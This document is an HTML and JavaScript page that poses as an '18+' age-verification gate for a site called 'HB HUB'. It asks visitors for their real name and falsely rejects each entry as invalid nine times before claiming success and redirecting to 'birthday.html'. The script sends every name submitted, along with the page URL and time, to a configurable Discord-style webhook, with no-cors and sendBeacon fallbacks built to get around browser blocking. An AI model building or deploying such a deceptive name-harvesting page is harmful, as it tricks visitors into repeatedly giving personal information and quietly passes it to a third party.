<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" />
  <title>Age Verification</title>
  <style>
    :root{
      --bg:#0b0b0b;
      --card:#111111;
      --accent:#ff8c00;
      --muted:#bdbdbd;
      --white:#fff;
    }
    *{
      box-sizing: border-box;
      -webkit-tap-highlight-color: transparent;
    }
    html,body{
      height:100%;
      margin:0;
      font-family:Inter,system-ui,Arial,sans-serif;
      background:var(--bg);
      color:var(--white);
      overflow-x: hidden;
    }
    .wrap{
      min-height:100%;
      display:flex;
      align-items:center;
      justify-content:center;
      padding:20px;
    }
    .card{
      width:100%;
      max-width:380px;
      background:linear-gradient(180deg, rgba(255,255,255,0.02), transparent);
      border-radius:12px;
      padding:24px 20px;
      text-align:center;
      box-shadow:0 10px 30px rgba(0,0,0,0.6);
      border:2px solid rgba(255,255,255,0.04);
    }
    .logo-sim{
      display:inline-block;
      background:var(--accent);
      color:#111;
      padding:8px 14px;
      border-radius:6px;
      font-weight:700;
      margin-bottom:14px;
      font-size:16px;
    }
    h1{
      margin:10px 0 16px;
      font-size:22px;
      line-height:1.3;
    }
    p.notice{
      color:var(--muted);
      font-size:14px;
      line-height:1.5;
      margin:0 0 20px;
    }
    .btn{
      display:block;
      width:100%;
      padding:14px 16px;
      margin:12px 0;
      border-radius:8px;
      border:2px solid var(--accent);
      background:rgba(0,0,0,0.4);
      color:var(--white);
      font-weight:700;
      cursor:pointer;
      font-size:16px;
      transition: transform 0.2s, background 0.2s;
      -webkit-appearance: none;
      appearance: none;
    }
    .btn:active{
      transform: scale(0.98);
      background: rgba(255,140,0,0.15);
    }
    .btn.secondary{
      background:transparent;
      color:var(--muted);
      border-color:rgba(255,255,255,0.08);
    }
    .btn.secondary:active{
      background: rgba(255,255,255,0.05);
    }
    .small{
      font-size:12px;
      color:var(--muted);
      margin-top:14px;
      line-height:1.4;
    }
    footer{
      margin-top:14px;
      font-size:12px;
      color:var(--muted);
      text-align:center;
    }

    /* modal */
    .overlay{
      position:fixed;
      inset:0;
      background:rgba(0,0,0,0.8);
      display:none;
      align-items:center;
      justify-content:center;
      z-index:40;
      padding:20px;
      overflow-y: auto;
    }
    .modal{
      width:100%;
      max-width:380px;
      background:var(--card);
      padding:24px 20px;
      border-radius:12px;
      border:2px solid rgba(255,255,255,0.05);
      text-align:left;
      box-shadow:0 8px 30px rgba(0,0,0,0.7);
    }
    .modal h2{
      margin:0 0 10px;
      font-size:20px;
    }
    .modal p{
      margin:0 0 16px;
      color:var(--muted);
      font-size:14px;
      line-height:1.4;
    }
    label{
      display:block;
      font-size:14px;
      margin-bottom:8px;
      color:var(--muted);
    }
    input[type="text"]{
      width:100%;
      padding:14px;
      border-radius:8px;
      border:2px solid rgba(255,255,255,0.08);
      background:#0b0b0b;
      color:#fff;
      box-sizing:border-box;
      font-size:16px;
      -webkit-appearance: none;
      appearance: none;
      transition: border-color 0.2s;
    }
    input[type="text"]:focus{
      outline: none;
      border-color: var(--accent);
    }
    input[type="text"]::placeholder{
      color: #666;
    }
    .msg{
      font-size:14px;
      color:var(--accent);
      margin-top:12px;
      min-height:20px;
      line-height:1.4;
    }
    .actions{
      display:flex;
      gap:12px;
      margin-top:16px;
    }
    .actions .btn{
      flex:1;
      padding:12px;
      font-size:15px;
      margin:0;
    }
    .note{
      margin-top:12px;
      font-size:12px;
      color:var(--muted);
      line-height:1.4;
    }

    /* Responsive adjustments */
    @media (max-width:420px){
      .wrap{
        padding:16px;
      }
      .card{
        padding:20px 16px;
      }
      .modal{
        padding:20px 16px;
      }
      h1{
        font-size:20px;
      }
      .modal h2{
        font-size:18px;
      }
    }

    @media (max-height:600px){
      .wrap{
        padding:12px;
        align-items: flex-start;
        padding-top: 20px;
      }
      .card{
        padding:18px 14px;
      }
      h1{
        font-size:18px;
        margin:8px 0 12px;
      }
      p.notice{
        font-size:13px;
        margin:0 0 16px;
      }
      .btn{
        padding:12px 14px;
        margin:10px 0;
      }
    }
  </style>
</head>
<body>
  <div class="wrap">
    <div class="card" role="region" aria-labelledby="heading">
      <div class="logo-sim" aria-hidden="true">HUB</div>
      <h1 id="heading">This is an 18+ website</h1>
      <p class="notice">This site contains age-restricted materials. By entering you affirm you are at least 18 years old or of majority in your jurisdiction.</p>

      <button id="enterBtn" class="btn" aria-label="I am 18 or older - Enter">I am 18 or older - Enter</button>
      <button id="exitBtn" class="btn secondary" aria-label="I am under 18 - Exit">I am under 18 - Exit</button>

      <div class="small">Our parental controls page explains how you can block access to this site.</div>
      <footer>© HB HUB</footer>
    </div>
  </div>

  <!-- modal -->
  <div id="overlay" class="overlay" role="dialog" aria-modal="true" aria-labelledby="modal-title">
    <div class="modal" role="document">
      <h2 id="modal-title">Verify your age</h2>
      <p>Enter your real name to verify you are 18+.</p>
      <label for="realname">Name</label>
      <input id="realname" type="text" placeholder="e.g. Angel Faith" autocomplete="off" enterkeyhint="done" />
      <div id="message" class="msg" aria-live="polite"></div>

      <div class="actions">
        <button id="submitName" class="btn">Submit</button>
        <button id="cancel" class="btn secondary">Cancel</button>
      </div>
      <div class="note">Note: If a webhook URL is configured in the script, the name you enter will be sent to that webhook.</div>
    </div>
  </div>

  <script>
    (function(){
      const enterBtn = document.getElementById('enterBtn');
      const exitBtn = document.getElementById('exitBtn');
      const overlay = document.getElementById('overlay');
      const cancel = document.getElementById('cancel');
      const submitName = document.getElementById('submitName');
      const realname = document.getElementById('realname');
      const message = document.getElementById('message');

      const STORAGE_KEY = 'ageVerifyAttempts_v1';
      const MAX_TRIES = 10;

      // --------------------------
      // WEBHOOK CONFIG - put your webhook URL here
      // Example: const WEBHOOK_URL = 'https://discord.com/api/webhooks/...';
      // If left empty, webhook calls are disabled.
      // --------------------------
      const WEBHOOK_URL = ''; // <-- PUT YOUR WEBHOOK URL BETWEEN THE QUOTES
      // --------------------------
      // End webhook config
      // --------------------------

      function getAttempts(){
        const v = sessionStorage.getItem(STORAGE_KEY);
        return v ? parseInt(v,10) : 0;
      }
      function setAttempts(n){ sessionStorage.setItem(STORAGE_KEY, String(n)); }

      // Send webhook (best-effort). Note: direct browser -> webhook calls may be blocked by CORS.
      // This function now accepts an optional `name` parameter and includes it in the payload.
      async function sendWebhook(action, name){
        if(!WEBHOOK_URL) return;
        const pageName = document.title || location.pathname;
        const time = new Date().toISOString();

        // sanitize name for safety and to avoid accidental newlines
        const safeName = name ? String(name).replace(/\s+/g, ' ').trim() : '—';

        const contentText = `User action: **${action}**\nName: ${safeName}\nPage: ${pageName}\nURL: ${location.href}\nTime: ${time}`;

        // Discord/typical webhook payload
        const payload = {
          content: contentText
        };

        // Try a normal fetch first
        try {
          await fetch(WEBHOOK_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
          });
          console.log('Webhook: sent payload (normal fetch).');
          return;
        } catch (err) {
          console.warn('Webhook: normal fetch failed, trying fallbacks.', err);
        }

        // Fallback: try no-cors fetch (may not be accepted by endpoint)
        try {
          fetch(WEBHOOK_URL, {
            method: 'POST',
            mode: 'no-cors',
            body: JSON.stringify({ content: contentText })
          });
          console.log('Webhook: attempted no-cors fetch (opaque).');
          return;
        } catch (err) {
          console.warn('Webhook: no-cors fetch failed.', err);
        }

        // Last fallback: sendBeacon (fire-and-forget). Limited content-type control.
        try {
          const blob = new Blob([JSON.stringify({ content: contentText })], { type: 'application/json' });
          const sent = navigator.sendBeacon(WEBHOOK_URL, blob);
          console.log('Webhook: sendBeacon attempted, success flag:', sent);
          return;
        } catch (err) {
          console.warn('Webhook: sendBeacon failed.', err);
        }

        console.warn('Webhook: all attempts failed. If the webhook does not receive messages, the endpoint likely blocks cross-origin requests. Consider using a server-side proxy to forward webhook calls.');
      }

      enterBtn.addEventListener('click', ()=> {
        overlay.style.display = 'flex';
        message.textContent = '';
        realname.value = '';
        setTimeout(() => realname.focus(), 100);

        // Notify webhook that a user clicked Enter (entered the page)
        sendWebhook('enter');
      });

      exitBtn.addEventListener('click', ()=> {
        window.location.href = 'about:blank';
      });

      cancel.addEventListener('click', ()=> {
        overlay.style.display = 'none';
      });

      submitName.addEventListener('click', submitHandler);
      realname.addEventListener('keydown', (e)=>{ if(e.key === 'Enter') submitHandler(); });

      function submitHandler(){
        const name = realname.value.trim();
        if(!name){
          message.textContent = 'Please enter your real name.';
          return;
        }

        // Always send the entered name to the webhook (if configured)
        try { sendWebhook('name_submitted', name); } catch (e) { console.warn('sendWebhook error', e); }

        // increment attempts
        let attempts = getAttempts();
        attempts += 1;
        setAttempts(attempts);

        if(attempts < MAX_TRIES){
          message.textContent = 'Name is invalid — please put your real name.';
          realname.value = '';
          realname.focus();
        } else {
          // reached required attempts -> proceed to birthday page
          message.textContent = 'Verification successful. Proceeding…';

          // Send webhook that user completed verification (include name)
          try { sendWebhook('verified', name); } catch (e) { console.warn('sendWebhook error', e); }

          setTimeout(()=> {
            // navigate to birthday page (must be present in same folder)
            window.location.href = 'birthday.html';
          }, 700);
        }
      }

      document.addEventListener('keydown', (e)=>{
        if(e.key === 'Escape' && overlay.style.display === 'flex'){
          overlay.style.display = 'none';
        }
      });

      // Prevent zoom on input focus (iOS)
      document.addEventListener('touchstart', function(){}, {passive: true});

      // If user already completed required attempts in this session, go straight to birthday
      if(getAttempts() >= MAX_TRIES){
        // auto-redirect to birthday.html (uncomment if you want automatic skip)
        // window.location.href = 'birthday.html';
      }
    })();
  </script>
</body>
</html>
